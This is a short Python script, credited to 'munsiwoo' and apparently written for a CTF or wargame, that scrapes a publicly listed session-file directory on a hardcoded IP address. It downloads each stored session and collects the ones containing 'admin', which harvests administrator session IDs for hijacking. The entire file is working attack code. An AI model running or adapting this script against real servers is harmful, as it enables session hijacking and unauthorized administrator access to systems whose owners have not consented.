import requests
from bs4 import BeautifulSoup

# made by munsiwoo

url = "http://45.32.105.237/data/session/?C=S;O=D"
html = requests.get(url).text
soup = BeautifulSoup(html, 'html.parser')
admin_session = []

for x in range(5, html.count("<a")) :
	session = soup.find_all('a')[x].get_text()
	url = "http://45.32.105.237/data/session/"+str(session)
	print(url)
	contents = requests.get(url).text
	if(contents.find("admin") != -1):
		admin_session.append(session)
		print(session)

print(admin_session)